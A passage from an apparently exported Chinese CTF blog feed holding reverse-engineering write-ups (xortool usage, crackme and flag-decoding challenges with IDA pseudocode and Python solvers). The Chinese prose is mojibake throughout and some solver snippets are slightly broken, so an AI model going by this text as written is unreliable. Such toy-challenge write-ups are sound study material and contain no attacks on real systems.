<pre><code> 2void decode(int forward, int back, int re[]){ 
 3     int i;
 4     int local1, local2, local3, local4, local5 = 0;//, eax, ecx, ebx;
 5     int result[5] = {0};
 6     printf(&quot;%c %c &quot;, (char)forward, (char)back);
 7     //temp = (forward &amp; 1) + 6; // forward % 2 + 6;
 8     //temp1 = (back &gt;&gt; 2 ) &amp; 1; // back / 4 % 2
 9     //local3ä¸ºç¬¬ä¸€ä½
10     // forward % 2+6+back / 4 % 2
11     local3 = (forward &amp; 1) + 6 + ((back &gt;&gt; 2 ) &amp; 1);
12     result[0] = local3;
13     //local4ä¸ºç¬¬äºŒä½
14     //ecx = ((forward &gt;&gt; 3)&amp; 1)+6;// &gt;&gt; 3 == / 8; &amp; 1 == % 2
15     //eax = (back &gt;&gt; 3) &amp; 1;
16     //forward / 8 % 2 + 6 + back / 8 % 2;
17     local4 = ((forward &gt;&gt; 3)&amp; 1)+6+((back &gt;&gt; 3) &amp; 1);
18     result[1] = local4;
19     //local1ä¸ºç¬¬ä¸‰ä½
20     // forward / 2 % 2 + 6 + back / 8 % 2;
21     local1 = ((forward &gt;&gt; 1) &amp; 1)+6 + ((back &gt;&gt; 4) &amp; 1);
22     result[2] = local1;
23     //ç¬¬4ä½åœ¨ecxå³local2ä¸­
24     local2 = (back &amp; 1 )+6+((forward&gt;&gt;2)&amp;1);
25     result[3] = local2;
26     //ç¬¬5ä½åœ¨ebxä¸­
27     local5 = ((back &gt;&gt; 1) &amp; 1)+6+((forward &gt;&gt; 4) &amp; 1);
28     result[4] = local5;
29     printf(&quot;%d%d%d%d%d  &quot;, result[0], result[1], result[2], result[3], result[4]);
30     for(i = 0; i &lt; 5; i++){ 
31         re[i] = result[i];
32     }
33     //return result;
34 }
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>xortoolçš„å®‰è£…ä½¿ç”¨</title>
    <url>/2016/10/05/xortool%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Xortool.pyæ˜¯ä¸€æ¬¾åŸºäºpythonçš„è„šæœ¬ï¼Œç”¨æ¥å®Œæˆä¸€äº›xoråˆ†æã€‚<br><a id="more"></a></p>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><ul>
<li>çŒœæƒ³keyçš„é•¿åº¦</li>
<li>çŒœæƒ³keyçš„å€¼</li>
<li><p>è§£å¯†ä¸€äº›ç»è¿‡xoeåŠ å¯†çš„æ–‡ä»¶</p>
<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>xortoolä¾èµ–äºpythonçš„å‘½ä»¤è¡Œå‚æ•°è§£é‡Šå™¨docoptã€‚</p>
<p>  $ sudo pip install docopt<br>Then install xortool:</p>
<p>  $ cd /data/src/<br>  $ git clone <a href="https://github.com/hellman/xortool.git" target="_blank" rel="external">https://github.com/hellman/xortool.git</a><br>  $ cd xortool/<br>  $ sudo python setup.py install</p>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2></li>
</ul>
<h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><pre><code>-l,--key-length
    length of the key (integer)
-c,--char
    most possible char (one char or hex code)
-m,--max-keylen=32
    maximum key length to probe (integer)
-x,--hex
    input is hex-encoded str
-b,--brute-chars
    brute force all possible characters
-o,--brute-printable
    same as -b but will only use printable characters for keys
</code></pre><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>è¯¦ç»†åŠŸèƒ½å‚è§<br><img src="https://www.aldeid.com/wiki/Xortool" alt="å®˜æ–¹è¯´æ˜"><br>è¿™é‡Œå’Œå¤§å®¶åˆ†äº«ä¸€ä¸ªè§£å¯†æ–‡ä»¶çš„åŠŸèƒ½ï¼Œåœ¨xortoolé‡Œæœ‰ä¸€ä¸ªåä¸ºxortool-xorçš„æ–‡ä»¶ï¼Œå®ƒå¯ä»¥å°†xoråŠ å¯†çš„æ–‡ä»¶è§£å¯†ã€‚</p>
<p>æœ‰ä¸€ä¸ªåŠ å¯†çš„æ–‡ä»¶ä¸ºflag.encrypted,å¼‚æˆ–åŠ å¯†çš„å¯†é’¥æ˜¯dc647eb65e6711e155375218212b3964ï¼Œ</p>
<p><img src="http://i1.piimg.com/567571/6931a5b710e21777.png" alt=""></p>
<p>è¿™æ ·å°±è§£å¯†äº†ã€‚ã€‚ã€‚</p>
]]></content>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡å¤§æ ¡èµ›</title>
    <url>/2017/01/15/%E4%BF%A1%E5%A4%A7%E6%A0%A1%E8%B5%9B/</url>
    <content><![CDATA[<p>å‚åŠ ä¿¡å¤§æ ¡èµ›é¢˜ç›®è®°å½•<br><a id="more"></a></p>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>é¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œä½¿ç”¨åç¼–è¯‘å·¥å…·æŸ¥çœ‹javaä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>import android.content.Context;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.Toast;

class a
  implements View.OnClickListener
{
  a(MainActivity paramMainActivity, EditText paramEditText, Context paramContext) {}

  public void onClick(View paramView)
  {
    if (this.a.getText().toString().equals(String.format(&quot;flag{%s}&quot;, new Object[] { MainActivity.m.substring(12, 24) })))
    {
      Toast.makeText(this.b, &quot;You are right!&quot;, 1).show();
      return;
    }
    Toast.makeText(this.b, &quot;You are wrong!&quot;, 1).show();
  }
}
</code></pre><p>ç¨‹åºçš„ä¸»è¦ç®—æ³•æµç¨‹æ˜¯å°†<br>gUID<em>P@Rt}T10n</em>$C#3m3Gu]d_par7|t)On<em>SCH3M3<br>è¿™ä¸ªå­—ç¬¦ä¸²ç»è¿‡substring(12, 24)å˜åŒ–ä¹‹åå¾—åˆ°æ–°çš„å­—ç¬¦ä¸²ï¼Œsubstring() æ–¹æ³•ç”¨äºæå–å­—ç¬¦ä¸²ä¸­ä»‹äºä¸¤ä¸ªæŒ‡å®šä¸‹æ ‡ä¹‹é—´çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´å°†ä¸‹æ ‡12åˆ°ä¸‹æ ‡20ä¹‹é—´çš„å­—ç¬¦ä¸²æå–å‡ºæ¥ï¼Œç»“æœæ˜¯0n</em>$C#3m3Gu]ã€‚</p>
<h1 id="warmup-re"><a href="#warmup-re" class="headerlink" title="warmup-re"></a>warmup-re</h1><p>æ‹–åˆ°IDAé‡Œçœ‹ä¸€ä¸‹ä¼ªä»£ç ï¼š</p>
<pre><code>// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax@1
  __int64 v4; // rdx@1
  __int64 v5; // rax@1
  __int64 v6; // rbx@1
  __int64 v7; // rdx@1
  __int64 v8; // rax@1
  __int64 v9; // rdx@1
  __int64 v10; // rax@2
  __int64 v11; // rdx@2
  int result; // eax@2
  __int64 v13; // rax@5
  __int64 v14; // rdx@5
  unsigned __int64 v15; // rbx@7
  unsigned __int64 v16; // rax@7
  __int64 v17; // rax@8
  __int64 v18; // rdx@8
  char v19[48]; // [sp+20h] [bp-60h]@1
  char v20[48]; // [sp+50h] [bp-30h]@1
  char v21[48]; // [sp+80h] [bp+0h]@4
  int v22; // [sp+B0h] [bp+30h]@1
  int v23; // [sp+B4h] [bp+34h]@1
  int v24; // [sp+B8h] [bp+38h]@1
  int v25; // [sp+BCh] [bp+3Ch]@1
  int v26; // [sp+C0h] [bp+40h]@1
  int v27; // [sp+C4h] [bp+44h]@1
  int v28; // [sp+C8h] [bp+48h]@1
  int v29; // [sp+CCh] [bp+4Ch]@1
  int v30; // [sp+D0h] [bp+50h]@1
  int v31; // [sp+D4h] [bp+54h]@1
  int v32; // [sp+D8h] [bp+58h]@1
  int v33; // [sp+DCh] [bp+5Ch]@1
  int v34; // [sp+E0h] [bp+60h]@1
  int v35; // [sp+E4h] [bp+64h]@1
  int v36; // [sp+E8h] [bp+68h]@1
  int v37; // [sp+ECh] [bp+6Ch]@1
  int v38; // [sp+F0h] [bp+70h]@1
  int v39; // [sp+F4h] [bp+74h]@1
  int v40; // [sp+F8h] [bp+78h]@1
  int v41; // [sp+FCh] [bp+7Ch]@1
  int v42; // [sp+100h] [bp+80h]@1
  char v43; // [sp+10Ah] [bp+8Ah]@4
  char v44; // [sp+10Bh] [bp+8Bh]@4
  int i; // [sp+10Ch] [bp+8Ch]@3

  _main();
  v22 = 86;
  v23 = 30;
  v24 = 24;
  v25 = 1;
  v26 = 21;
  v27 = 90;
  v28 = 27;
  v29 = 29;
  v30 = 6;
  v31 = 29;
  v32 = 76;
  v33 = 84;
  v34 = 22;
  v35 = 20;
  v36 = 85;
  v37 = 28;
  v38 = 22;
  v39 = 21;
  v40 = 30;
  v41 = 29;
  v42 = 23;
  LODWORD(v3) = std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, v19, refptr__ZSt3cin);
  std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, v20, v3);
  LODWORD(v5) = strlen(*(_QWORD *)&amp;argc, argv, v4, v19);
  v6 = v5;
  LODWORD(v8) = strlen(*(_QWORD *)&amp;argc, argv, v7, v20);
  if ( v6 == v8 )
  {
    for ( i = 0; ; ++i )
    {
      v15 = i;
      LODWORD(v16) = strlen(*(_QWORD *)&amp;argc, argv, v9, v19);
      if ( v15 &gt;= v16 )
        break;
      v44 = v19[i];
      v43 = v20[i];
      v21[i] = v43 ^ v44;
      v9 = (unsigned int)v21[i];
      if ( (_DWORD)v9 != *(&amp;v22 + i) )
      {
        LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, &quot;key error&quot;, refptr__ZSt4cout);
        std::ostream::operator&lt;&lt;(
          *(_QWORD *)&amp;argc,
          argv,
          refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
          v13);
        system(*(_QWORD *)&amp;argc, argv, v14, &quot;pause&quot;);
        return 0;
      }
    }
    LODWORD(v17) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(
                     *(_QWORD *)&amp;argc,
                     argv,
                     &quot;Yes!input is flag&quot;,
                     refptr__ZSt4cout);
    std::ostream::operator&lt;&lt;(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
      v17);
    system(*(_QWORD *)&amp;argc, argv, v18, &quot;pause&quot;);
    result = 0;
  }
  else
  {
    LODWORD(v10) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(*(_QWORD *)&amp;argc, argv, &quot;lenth error&quot;, refptr__ZSt4cout);
    std::ostream::operator&lt;&lt;(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_,
      v10);
    system(*(_QWORD *)&amp;argc, argv, v11, &quot;pause&quot;);
    result = 0;
  }
  return result;
}
</code></pre><p>ç¨‹åºçš„æ„æ€å°±æ˜¯è¾“å…¥ä¸¤ä¸ªé•¿åº¦ç›¸ç­‰çš„å­—ç¬¦ä¸²ä¹‹åè¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°†è¿ç®—ç»“æœå’Œç¨‹åºç»™å‡ºçš„v22çš„æ•°ç»„ä¸­çš„å†…å®¹æ¯”è¾ƒï¼Œæç¤ºç»™å‡ºå…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯goodgoodstudydaydayupï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>v1=[86,30,24,1,21,90,27,29,6,29,76,84,22,20,85,28,22,21,30,29,23]
v2=[103,111,111,100,103,111,111,100,115,116,117,100,121,100,97,121,100,97,121,117,112]
flag=[]
for i in xrange(0,21):
    flag+=chr(list(v1)[i]^list(v2)[i])
print(flag)
</code></pre><p>ç»“æœæ˜¯</p>
<pre><code>[&apos;1&apos;, &apos;q&apos;, &apos;w&apos;, &apos;e&apos;, &apos;r&apos;, &apos;5&apos;, &apos;t&apos;, &apos;y&apos;, &apos;u&apos;, &apos;i&apos;, &apos;9&apos;, &apos;0&apos;, &apos;o&apos;, &apos;p&apos;, &apos;4&apos;, &apos;e&apos;, &apos;r&apos;, &apos;t&apos;, &apos;g&apos;, &apos;h&apos;, &apos;g&apos;]
</code></pre><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>ä½¿ç”¨IDAåˆ†æï¼Œå…³é”®å‡½æ•°æ˜¯encrypt()</p>
<pre><code>       v19 = 0;
  LODWORD(v16) = std::string::operator[](a2, 0LL);
  while ( *v16 )
  {
    LODWORD(v2) = std::string::operator[](a2, v19);
    v3 = *v2;
    LODWORD(v4) = std::vector&lt;int,std::allocator&lt;int&gt;&gt;::operator[](&amp;primos, v19);
    v18 = v3 + *v4;
    LODWORD(v5) = std::string::operator[](a2, v19);
    if ( (unsigned __int8)is_lower(*v5) )
    {
      v6 = 122;
    }
    else
    {
      LODWORD(v7) = std::string::operator[](a2, v19);
      if ( (unsigned __int8)is_upper(*v7) )
      {
        v6 = 90;
      }
      else
      {
        LODWORD(v8) = std::string::operator[](a2, v19);
        v6 = *v8;
      }
    }
    while ( v18 &gt; v6 )
      v18 -= 26;
    LODWORD(v9) = std::string::operator[](a2, v19);
    v10 = v9;
    LODWORD(v11) = std::string::operator[](a2, v19);
    if ( *v11 == 123 )
    {
      v14 = 125;
    }
    else
    {
      LODWORD(v12) = std::string::operator[](a2, v19);
      if ( *v12 == 125 )
      {
        v14 = 123;
      }
      else
      {
        LODWORD(v13) = std::string::operator[](a2, v19);
        if ( (unsigned __int8)is_alphabet(*v13) )
        {
          v14 = v18;
        }
        else
        {
          LODWORD(v15) = std::string::operator[](a2, v19);
          v14 = *v15;
        }
      }
    }
    *v10 = v14;
    LODWORD(v16) = std::string::operator[](a2, ++v19);
  }
  std::string::string(a1, a2);
  return a1;
}
</code></pre><p>æŸ¥æ‰¾å­—ç¬¦ä¸²è¿˜æ‰¾åˆ°äº†ä¸ªflag</p>
<pre><code>LNLNGW}o3A3g5Z_1b_Xv5d_WbzgGnbG{
</code></pre><p>ç¨‹åºæµç¨‹æ˜¯å°†ä½ è¾“å…¥çš„æ­£ç¡®çš„flagï¼Œæ¯ä¸€ä½åŠ ä¸Šprime[]ç›¸åº”ä½ç½®çš„å€¼ï¼Œå¦‚æœæ˜¯{}çš„è¯ï¼Œ{æ¢æˆï½ï¼Œï½æ¢æˆï½›ã€‚å¦‚æœæ˜¯å­—æ¯ï¼Œåˆ¤æ–­å¤§å°å†™è¿ç®—åæ˜¯å¦è¶…å‡ºèŒƒå›´ï¼Œå¦‚æœè¶…å‡ºèŒƒå›´å°±å‡å»26ç›´åˆ°ç¬¦åˆå¤§å°å†™èŒƒå›´ä¸ºæ­¢ï¼Œç„¶åé€†æ¨ç®—æ³•å°±å¯ä»¥äº†ã€‚æ¯”è¾ƒéº»çƒ¦çš„æ˜¯prime[]æ˜¯ä»€ä¹ˆï¼Œç¨‹åºé‡Œè¿˜æœ‰ä¸€ä¸ªinitial()</p>
<pre><code>  for ( i = 2; i &lt;= 1023; ++i )
    ehprimo[(signed __int64)i] = (i &amp; 1) != 0;
  for ( j = 3; ; j += 2 )
  {
    result = j;
    if ( (signed int)j &gt; 1023 )
      break;
    if ( ehprimo[(signed __int64)(signed int)j] )
    {
      std::vector&lt;int,std::allocator&lt;int&gt;&gt;::push_back(&amp;primos, &amp;j);
      for ( k = j * j; (signed int)k &lt;= 1023; k += j )
        ehprimo[(signed __int64)(signed int)k] = 0;
    }
  }
  return result;
}
</code></pre><p>è¿™ä¸ªå‡½æ•°æ˜¯æ±‚0~1024ä¹‹é—´çš„ç´ æ•°ï¼Œä¸åŒ…æ‹¬2ä½œä¸ºprime[]çš„æ•°æ®ã€‚</p>
<p>æœ€åé€†æ¨å‡ºæ¥flagä¸ºIIECTF{r3V3r5E_1s_Ea5y_DeadBeeF}</p>
<h1 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h1><p>IDAåç¼–è¯‘å‘ç°æƒ³è¦è·å¾—flagéœ€è¦é€šè¿‡4ä¸ªcheckå‡½æ•°ï¼š</p>
<p>ç¬¬ä¸€ä¸ªcheack</p>
<pre><code>signed int check1(void)
{
  signed int v1; // [sp+10h] [bp-8h]@7

  puts(&quot;Give me your favourite prime number&quot;);
  scanf(&quot;%lld&quot;, &amp;n);
  a = 0x100000LL;
  b = 0LL;
  c = 0LL;
  while ( !(a &amp; 1) )
  {
    a /= 2LL;
    ++b;
  }
  while ( !(b &amp; 1) )
  {
    b /= 2LL;
    ++c;
  }
  if ( c == n )
  {
    flag += n;
    v1 = 1;
  }
  else
  {
    puts(&quot;^^^^Your math is bad^^^^&quot;);
    v1 = 0;
  }
  return v1;
}
</code></pre><p>pythonè·‘å‡ºæ¥ç¬¦åˆæ¡ä»¶çš„æ•°æ˜¯2</p>
<pre><code>a=1048576
b=0
c=0
var=a&amp;1
while var==0:
    a=a/2
    var=a&amp;1
    b=b+1
print(b)
vbr=b&amp;1
while vbr==0:
    b=b/2
    vbr=b&amp;1
    c=c+1
print(c)
</code></pre><p>chack2</p>
<pre><code>signed int check2(void)
{
  signed int v1; // [sp+24h] [bp-14h]@10
  __int64 v2; // [sp+28h] [bp-10h]@1

  puts(&quot;Do you know how to calculate the number&quot;);
  puts(&quot;please enter a number&quot;);
  scanf(&quot;%lld&quot;, &amp;n);
  v2 = n;
  if ( tmpans != n * tmp % mod || n &gt; 999999 )
    goto LABEL_15;
  while ( n )
  {
    x[++pos] = n % 10;
    n /= 10LL;
  }
  if ( dword_448044 &gt;= dword_448048
    || dword_448048 &gt;= dword_44804C
    || dword_44804C &gt;= dword_448050
    || dword_448050 &gt;= dword_448054
    || dword_448054 &gt;= dword_448058 )
  {
LABEL_15:
    puts(&quot;You do not know how to calculate the mod~~~~&quot;);
    v1 = 0;
  }
  else
  {
    flag += v2;
    v1 = 1;
  }
  return v1;
}
</code></pre><p>pythonä»£ç å¾—å‡ºç¬¦åˆæ¡ä»¶çš„æ•°æ˜¯654321</p>
<pre><code>tmpans=779852816
tmp=123456
mod=1000000007
i=1
for i in xrange(1,1000000):
    if(i*tmp%mod==tmpans):
        print(i)
</code></pre><p>check3</p>
<p>pythonè„šæœ¬å¾—å‡ºç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²æ˜¯Lcont=gpfoog`q</p>
<pre><code>str1=[]
for i in range(14):
    j=i%6+1
    str1.append(j)
print(str1)

v18=&quot;MerryChristmas&quot;
list=list(v18)
for i in range(len(list)):
    list[i]=ord(list[i])
print(list)

flag=[]
for i in range(14):
    flag.append(list[i]-str1[i])
print(flag)

flag1=&quot;&quot;
for i in range(14):
    flag1+=chr(flag[i])
print(flag1)
</code></pre><p>check4</p>
<p>åœ¨ODé‡ŒåŠ¨æ€è°ƒè¯•ä¿®æ”¹è·³è½¬æœ€åä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æ•°å­—æ˜¯176455667</p>
<p>å››å…³éƒ½è¿‡äº†ï¼Œæœ€åå°†æ¯ä¸€å…³çš„keyè¾“å…¥å°±å¯ä»¥äº†ã€‚<br>flag is:176455667HqGpGpFoFoEnGpHqBk</p>
<h1 id="61dre"><a href="#61dre" class="headerlink" title="61dre"></a>61dre</h1><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  bool v3; // r13@2
  int v4; // eax@5
  const char *v5; // rdi@11
  size_t v6; // rax@11
  size_t v7; // rax@15
  char *v8; // rcx@15
  const char *v9; // rsi@15
  bool v10; // di@17
  const char **v12; // [sp+0h] [bp-80h]@2
  unsigned __int64 v13; // [sp+8h] [bp-78h]@11
  int v14; // [sp+14h] [bp-6Ch]@5
  char *s1; // [sp+18h] [bp-68h]@2
  const char **v16; // [sp+20h] [bp-60h]@2
  const char ***v17; // [sp+28h] [bp-58h]@2
  bool v18; // [sp+37h] [bp-49h]@2
  int *v19; // [sp+38h] [bp-48h]@2
  const char ***v20; // [sp+40h] [bp-40h]@2
  const char **v21; // [sp+48h] [bp-38h]@1
  int v22; // [sp+54h] [bp-2Ch]@1

  v22 = argc;
  v21 = argv;
  if ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                               &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
    goto LABEL_20;
  while ( 1 )
  {
    v12 = v21;
    v3 = (((_BYTE)x - 106 + 105) * (_BYTE)x &amp; 1) == 0;
    v20 = &amp;v12 - 2;
    v19 = (int *)&amp;v12;
    v18 = (_DWORD)v21 != 2;
    v17 = &amp;v12;
    v16 = (const char **)&amp;v12;
    s1 = (char *)(&amp;v12 - 6);
    if ( ((y &lt; 10 &amp;&amp; v3) | (unsigned __int8)((y &lt; 10) ^ v3)) &amp; 1 )
      break;
LABEL_20:
    LODWORD(v12) = 0;
    *((_DWORD *)&amp;v12 - 4) = v22;
    *(&amp;v12 - 2) = v21;
  }
  if ( v18 )
  {
    while ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                    &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
      ;
LABEL_5:
    v4 = printf(&quot;Usage: %s flag\n&quot;, **v17, v12);
    *v19 = 0;
    v14 = v4;
    return *v19;
  }
  *v16 = (const char *)&amp;unk_400E54;
  if ( strlen((*v17)[1]) != 32 )
  {
    while ( !(((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1)
                                                                                                * (_BYTE)x &amp; 1) != 0))) &amp; 1) )
      ;
    goto LABEL_5;
  }
  if ( !(((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) != 0))) &amp; 1) )
    goto LABEL_23;
  while ( 1 )
  {
    *(_DWORD *)v20 = 0;
    if ( ((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) != 0))) &amp; 1 )
      break;
LABEL_23:
    *(_DWORD *)v20 = 0;
  }
  while ( 1 )
  {
    v5 = (*v17)[1];
    v13 = *(_DWORD *)v20;
    v6 = strlen(v5);
    if ( v13 &gt;= v6 )
      break;
    if ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
      goto LABEL_24;
    while ( 1 )
    {
      s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);
      if ( ((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1 )
        break;
LABEL_24:
      s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x38 | ~*(_BYTE *)v20 &amp; 0xC7) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x38 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0xC7);
    }
    *(_DWORD *)v20 = *(_DWORD *)v20 - 403331085 + 403331086;
  }
  v7 = strlen((*v17)[1]);
  v8 = s1;
  s1[v7] = 0;
  v9 = *v16;
  if ( !strcmp(v8, *v16) )
    HIDWORD(v12) = printf(&quot;yes\n&quot;, v9, v12);
  do
    v10 = (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0;
  while ( !(((y &lt; 10 &amp;&amp; v10) | (unsigned __int8)((y &lt; 10) ^ v10)) &amp; 1) );
  *v19 = 0;
  return *v19;
}
</code></pre><p>ä»£ç å¾ˆå¤šï¼ŒçŒ›åœ°ä¸€çœ‹è‚¯å®šæœ‰ç‚¹è’™ï¼Œæˆ‘ä¹Ÿæ˜¯çœ‹äº†äººå®¶çš„writeupæ‰æ‡‚ã€‚ã€‚ã€‚<br>å…³é”®å°±åœ¨</p>
<pre><code>(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y&lt; 10&amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1)
</code></pre><p>è¿™æ®µä»£ç é‡Œçš„é€šè¿‡åŠ¨æ€è°ƒè¯•xï¼Œyä¸€ç›´éƒ½æ˜¯0ï¼Œè¿™ä¸ªæ¡ä»¶å§‹ç»ˆä¸ºçœŸã€‚<br>é‚£ä¹ˆç®—æ³•é€»è¾‘æ¥ä¸‹æ¥å°±æ˜¯</p>
<pre><code>s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17
)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);
</code></pre><p>æœ€ås1ä¸</p>
<pre><code>0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,0x64,0x66,0x55,0x7C,0x63,0x7
F,0x62,0x6B,0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,0x79,0x6A,0x79,0x7A,0x68
,0x72,0x6C,0x62]
</code></pre><p>è¿™ä¸²å­—ç¬¦æ¯”è¾ƒï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>    str=[ 0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,
      0x64,0x66,0x55,0x7C,0x63,0x7F,0x62,0x6B,
      0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,
      0x79,0x6A,0x79,0x7A,0x68,0x72,0x6C,0x62]
flag=&quot;&quot;
for i in range(len(str)):
    for j in xrange(32,128):
        if((j&amp;0x89 | ~j&amp;0x76)^(i&amp;0x89 | ~i&amp;0x76)==str[i]):
            flag=flag+chr(j)
print(flag)
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>å»¶è¿Ÿç»‘å®šæŠ€æœ¯åŸç†</title>
    <url>/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>åŠ¨æ€é“¾æ¥æ¯”é™æ€é“¾æ¥çµæ´»ï¼Œä½†ç‰ºç‰²äº†æ€§èƒ½ï¼Œæ®ç»Ÿè®¡ELFç¨‹åºåœ¨é™æ€é“¾æ¥ä¸‹æ¯”åŠ¨æ€åº“å¿«å¤§çº¦1%~5%ã€‚<br><a id="more"></a><br>ä¸»è¦åŸå› æ˜¯ï¼ŒåŠ¨æ€é“¾æ¥ä¸‹å¯¹äºå…¨å±€å’Œé™æ€æ•°æ®çš„è®¿é—®éƒ½è¦è¿›è¡Œå¤æ‚çš„GOTå®šä½ï¼Œç„¶åé—´æ¥å¯»å€ï¼Œå¯¹äºæ¨¡å—é—´çš„è°ƒç”¨ä¹Ÿè¦å…ˆå®šä½GOTï¼Œç„¶åè¿›è¡Œé—´æ¥è·³è½¬ã€‚<br>å¦å¤–ï¼ŒåŠ¨æ€é“¾æ¥çš„é“¾æ¥è¿‡ç¨‹æ˜¯åœ¨è¿è¡Œæ—¶å®Œæˆçš„ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå¯»æ‰¾å¹¶è½¬è½½æ‰€éœ€è¦çš„å¯¹è±¡ï¼Œç„¶åè¿›è¡Œç¬¦å·æŸ¥æ‰¾åœ°å€é‡å®šä½ç­‰å·¥ä½œã€‚</p>
<p>å»¶è¿Ÿç»‘å®šçš„å®ç°æ­¥éª¤å¦‚ä¸‹ï¼š</p>
